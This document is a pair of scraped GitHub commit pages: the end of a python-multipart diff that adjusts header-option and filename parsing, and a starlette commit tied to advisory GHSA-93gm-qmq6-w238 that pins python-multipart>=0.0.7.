|  |  | if key == b'filename': |
|  |  | if value[1:3] == b':\\' or value[:2] == b'\\\\': |
|  |  | value = value.split(b'\\')[-1] |
|  |  |  |
|  |  | options[key] = value |
|  |  |  |
|  |  | if key == 'filename': |
|  |  | if value[1:3] == ':\\' or value[:2] == '\\\\': |
|  |  | value = value.split('\\')[-1] |
|  |  | options[key.encode('latin-1')] = value.encode('latin-1') |
|  |  | return ctype, options |
|  |  |  |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `20f0ef6`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKludex%2Fpython-multipart%2Fcommit%2F20f0ef6b4e4caf7d69a667c54dff57fe467109a4) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_5eeaa811_20250114_181322.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fstarlette%2Fcommit%2F13e5c26a27f4903924624736abd6131b2da80cc5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fstarlette%2Fcommit%2F13e5c26a27f4903924624736abd6131b2da80cc5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=encode%2Fstarlette)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[encode](/encode)
/
**[starlette](/encode/starlette)**
Public

* [Notifications](/login?return_to=%2Fencode%2Fstarlette) You must be signed in to change notification settings
* [Fork
  954](/login?return_to=%2Fencode%2Fstarlette)
* [Star
   10.5k](/login?return_to=%2Fencode%2Fstarlette)

* [Code](/encode/starlette)
* [Issues
  21](/encode/starlette/issues)
* [Pull requests
  18](/encode/starlette/pulls)
* [Discussions](/encode/starlette/discussions)
* [Actions](/encode/starlette/actions)
* [Security](/encode/starlette/security)
* [Insights](/encode/starlette/pulse)

Additional navigation options

* [Code](/encode/starlette)
* [Issues](/encode/starlette/issues)
* [Pull requests](/encode/starlette/pulls)
* [Discussions](/encode/starlette/discussions)
* [Actions](/encode/starlette/actions)
* [Security](/encode/starlette/security)
* [Insights](/encode/starlette/pulse)

## Commit

[Permalink](/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-93gm-qmq6-w238](https://github.com/advisories/GHSA-93gm-qmq6-w238 "GHSA-93gm-qmq6-w238")

[Browse files](/encode/starlette/tree/13e5c26a27f4903924624736abd6131b2da80cc5)
Browse the repository at this point in the history

* Loading branch information

[![@tiangolo](https://avatars.githubusercontent.com/u/1326112?s=40&v=4)](/tiangolo)

[tiangolo](/encode/starlette/commits?author=tiangolo "View all commits by tiangolo")
authored
Feb 3, 2024

1 parent
[b8eebef](/encode/starlette/commit/b8eebef38711902769fc1846c9bb2a1fcd26960d)

commit 13e5c26

Showing
**1 changed file**
with
**1 addition**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[pyproject.toml](#diff-50c86b7ed8ac2cf95bd48334961bf0530cdc77b5a56f852c5c61b89d735fd711 "pyproject.toml")

Show comments

[View file](/encode/starlette/blob/13e5c26a27f4903924624736abd6131b2da80cc5/pyproject.toml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,7 +36,7 @@ dependencies = [ |
|  |  | full = [ |
|  |  | "itsdangerous", |
|  |  | "jinja2", |
|  |  | "python-multipart", |
|  |  | "python-multipart>=0.0.7", |
|  |  | "pyyaml", |
|  |  | "httpx>=0.22.0", |
|  |  | ] |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `13e5c26`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fstarlette%2Fcommit%2F13e5c26a27f4903924624736abd6131b2da80cc5) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


